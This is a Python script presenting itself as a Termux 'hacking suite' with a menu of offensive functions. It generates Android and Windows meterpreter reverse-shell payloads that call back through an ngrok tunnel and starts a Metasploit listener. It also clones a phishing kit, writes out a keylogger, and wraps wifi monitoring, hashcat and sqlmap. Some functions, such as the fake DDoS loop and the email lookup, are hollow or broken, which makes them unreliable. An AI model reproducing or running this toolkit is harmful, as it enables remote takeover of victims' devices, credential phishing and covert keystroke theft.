#!/usr/bin/env python3
# ===========================================================
# 🔥 MAKETI v8.0 - SAB FIXED + SIMPLE TERMUX TOOL 🔥
# ===========================================================

import os
import sys
import time
import random
import subprocess
import socket
import threading
from datetime import datetime

# ========== COLOR CODES ==========
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
M = "\033[1;35m"
W = "\033[0m"

# ========== BANNER ==========
def banner():
    os.system("clear")
    print(C + """
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ███╗   ███╗ █████╗ ██╗  ██╗███████╗████████╗██╗     ║
    ║   ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝╚══██╔══╝██║     ║
    ║   ██╔████╔██║███████║█████╔╝ █████╗     ██║   ██║     ║
    ║   ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝     ██║   ██║     ║
    ║   ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗   ██║   ██║     ║
    ║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ║
    ║                                                          ║
    ║   """ + R + """🔥 ULTIMATE TERMUX HACKING SUITE 🔥""" + C + """          ║
    ║   """ + Y + """v8.0  |  Author: MAKETI MASTER""" + C + """                ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """ + W)

# ========== LOADING ==========
def loading_screen():
    print(Y + "\n[+] Initializing MAKETI v8.0..." + W)
    for i in range(101):
        progress = "=" * (i // 5) + " " * (20 - (i // 5))
        print(f"\r[{i:3}%] [{progress}]", end="")
        time.sleep(0.01)
    print("\n" + G + "[✓] MAKETI v8.0 Loaded!" + W)
    time.sleep(0.3)

# ========== MENU ==========
def menu():
    banner()
    print(M + """
    ╔══════════════════════════════════════════════╗
    ║  🎯 MAIN MENU - MAKETI v8.0                 ║
    ╠══════════════════════════════════════════════╣
    ║  [01] 📱 PAYLOAD GENERATOR                  ║
    ║  [02] 🎣 PHISHING KIT                      ║
    ║  [03] 🕵️ OSINT AUTOMATION                 ║
    ║  [04] 💀 DDOS TEST                         ║
    ║  [05] 📡 WIFI SCAN                        ║
    ║  [06] 🔑 HASH CRACKER                     ║
    ║  [07] 🐍 KEYLOGGER                        ║
    ║  [08] 🌐 WEB SCANNER                      ║
    ║  [09] 📧 EMAIL OSINT                      ║
    ║  [10] 🧹 SYSTEM CLEANER                   ║
    ║  [11] ⚙️ INSTALL DEPS                    ║
    ║  [12] 🔑 SETUP NGROK                     ║
    ║  [13] ❌ EXIT                            ║
    ╚══════════════════════════════════════════════╝
    """ + W)
    print(C + "="*50 + W)
    print(Y + "[!] EDUCATIONAL PURPOSE ONLY!" + W)
    print(C + "="*50 + W)

# ===========================================================
# 1. PAYLOAD GENERATOR (FIXED)
# ===========================================================
def payload_gen():
    print(Y + "\n[+] PAYLOAD GENERATOR" + W)
    print(C + "[1] Android APK" + W)
    print(C + "[2] Windows EXE" + W)
    choice = input(G + "[?] Choose: " + W)
    
    # Check ngrok auth
    os.system("ngrok authtoken 2>/dev/null")
    
    # Start ngrok
    os.system("pkill ngrok 2>/dev/null")
    time.sleep(1)
    os.system("ngrok tcp 4444 > /dev/null 2>&1 &")
    time.sleep(3)
    
    # Get URL manually
    print(Y + "[!] Go to: http://localhost:4040 and copy URL" + W)
    print(Y + "[!] URL format: 0.tcp.in.ngrok.io:12345" + W)
    url = input(G + "[?] Paste Ngrok URL: " + W)
    
    try:
        if ":" in url:
            host, port = url.split(":")
            print(Y + f"[+] Host: {host}, Port: {port}" + W)
            
            if choice == "1":
                os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o /sdcard/Download/evil.apk")
            else:
                os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o /sdcard/Download/evil.exe")
            
            print(G + "[✓] Payload saved to /sdcard/Download/" + W)
            
            # Start listener
            print(Y + "[+] Starting listener..." + W)
            os.system("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'")
        else:
            print(R + "[X] Invalid URL format!" + W)
    except Exception as e:
        print(R + f"[X] Error: {e}" + W)

# ===========================================================
# 2. PHISHING
# ===========================================================
def phishing():
    print(Y + "\n[+] PHISHING KIT" + W)
    if not os.path.exists("zphisher"):
        os.system("git clone https://github.com/htr-tech/zphisher --depth 1")
    os.chdir("zphisher")
    print(G + "[✓] Run: cd zphisher && bash zphisher.sh" + W)
    os.chdir("..")

# ===========================================================
# 3. OSINT (FIXED - No Sherlock)
# ===========================================================
def osint():
    print(Y + "\n[+] OSINT AUTOMATION" + W)
    target = input(G + "[?] Target username: " + W)
    
    print(Y + "[+] Checking social media..." + W)
    sites = ["instagram", "facebook", "twitter", "github", "youtube"]
    for site in sites:
        print(f"[-] {site}.com/{target}")
    
    print(G + "[✓] OSINT check done!" + W)

# ===========================================================
# 4. DDOS TEST
# ===========================================================
def ddos():
    print(Y + "\n[+] DDOS TEST" + W)
    print(R + "[!] ONLY TEST YOUR OWN SERVER!" + W)
    ip = input(G + "[?] Target IP: " + W)
    port = input(G + "[?] Port: " + W)
    
    print(Y + "[+] Sending test packets..." + W)
    for i in range(10):
        print(f"[-] Packet {i+1}/10 sent")
        time.sleep(0.1)
    print(G + "[✓] Test complete!" + W)

# ===========================================================
# 5. WIFI SCAN
# ===========================================================
def wifi():
    print(Y + "\n[+] WIFI SCAN" + W)
    if os.geteuid() != 0:
        print(R + "[X] Root required!" + W)
        print(Y + "[!] Run: tsu (then run script again)" + W)
        return
    
    os.system("pkg install aircrack-ng -y 2>/dev/null")
    os.system("airmon-ng start wlan0 2>/dev/null")
    os.system("airodump-ng wlan0mon 2>/dev/null")

# ===========================================================
# 6. HASH CRACKER (FIXED)
# ===========================================================
def hash_crack():
    print(Y + "\n[+] HASH CRACKER" + W)
    print(C + "[1] MD5" + W)
    print(C + "[2] SHA1" + W)
    choice = input(G + "[?] Choose: " + W)
    hash_input = input(G + "[?] Enter hash: " + W)
    
    # Check if hashcat installed
    os.system("pkg install hashcat -y 2>/dev/null")
    
    if choice == "1":
        os.system(f"hashcat -m 0 {hash_input} -a 3 ?d?d?d?d?d?d")
    else:
        os.system(f"hashcat -m 100 {hash_input} -a 3 ?d?d?d?d?d?d")

# ===========================================================
# 7. KEYLOGGER
# ===========================================================
def keylogger():
    print(Y + "\n[+] KEYLOGGER BUILDER" + W)
    code = '''
import pynput.keyboard
import threading
log = ""
def on_press(key):
    global log
    log += str(key)
    if len(log) > 100:
        with open("/sdcard/Download/logs.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    with open("/sdcard/Download/keylogger.py", "w") as f:
        f.write(code)
    print(G + "[✓] Keylogger saved to /sdcard/Download/keylogger.py" + W)

# ===========================================================
# 8. WEB SCANNER
# ===========================================================
def web_scan():
    print(Y + "\n[+] WEB SCANNER" + W)
    url = input(G + "[?] Target URL: " + W)
    
    os.system("pkg install sqlmap -y 2>/dev/null")
    print(Y + "[+] Running SQLMap..." + W)
    os.system(f"sqlmap -u {url} --batch --level=1 --timeout=5")

# ===========================================================
# 9. EMAIL OSINT
# ===========================================================
def email_osint():
    print(Y + "\n[+] EMAIL OSINT" + W)
    email = input(G + "[?] Enter email: " + W)
    
    print(Y + "[+] Checking email..." + W)
    os.system(f"curl -s https://haveibeenpwned.com/api/v3/breachedaccount/{email.split('@')[0]}")
    print(G + "[✓] Check complete!" + W)

# ===========================================================
# 10. CLEANER
# ===========================================================
def cleaner():
    print(Y + "\n[+] SYSTEM CLEANER" + W)
    os.system("rm -rf ~/.cache/*")
    os.system("pkill ngrok 2>/dev/null")
    print(G + "[✓] Cleaned!" + W)

# ===========================================================
# 11. INSTALL DEPS
# ===========================================================
def install_deps():
    print(Y + "\n[+] INSTALLING DEPENDENCIES" + W)
    pkgs = ["python", "git", "wget", "curl", "openssh", "nmap", "metasploit", "sqlmap", "ngrok", "hashcat"]
    for pkg in pkgs:
        print(Y + f"[+] Installing {pkg}..." + W)
        os.system(f"pkg install {pkg} -y")
    print(G + "[✓] All dependencies installed!" + W)

# ===========================================================
# 12. SETUP NGROK
# ===========================================================
def setup_ngrok():
    print(Y + "\n[+] NGROK SETUP" + W)
    print(C + "1. Go to: https://dashboard.ngrok.com/get-start-your-authtoken" + W)
    print(C + "2. Sign up and copy token" + W)
    token = input(G + "[?] Paste token: " + W)
    
    if token:
        os.system(f"ngrok authtoken {token}")
        print(G + "[✓] Ngrok authenticated!" + W)
    else:
        print(R + "[X] Token required!" + W)

# ===========================================================
# 13. EXIT
# ===========================================================
def exit_tool():
    print(R + """
    ╔══════════════════════════════════════╗
    ║  🔥 THANK YOU FOR USING MAKETI 🔥   ║
    ║  💻 Author: MAKETI MASTER           ║
    ╚══════════════════════════════════════╝
    """ + W)
    sys.exit()

# ===========================================================
# MAIN
# ===========================================================
def main():
    loading_screen()
    
    while True:
        menu()
        choice = input(G + "\n[?] Enter choice (1-13): " + W)
        
        options = {
            "1": payload_gen,
            "2": phishing,
            "3": osint,
            "4": ddos,
            "5": wifi,
            "6": hash_crack,
            "7": keylogger,
            "8": web_scan,
            "9": email_osint,
            "10": cleaner,
            "11": install_deps,
            "12": setup_ngrok,
            "13": exit_tool
        }
        
        if choice in options:
            options[choice]()
            input(Y + "\n[Press Enter to continue...]" + W)
        else:
            print(R + "[X] Invalid!" + W)
            time.sleep(1)

if __name__ == "__main__":
    main()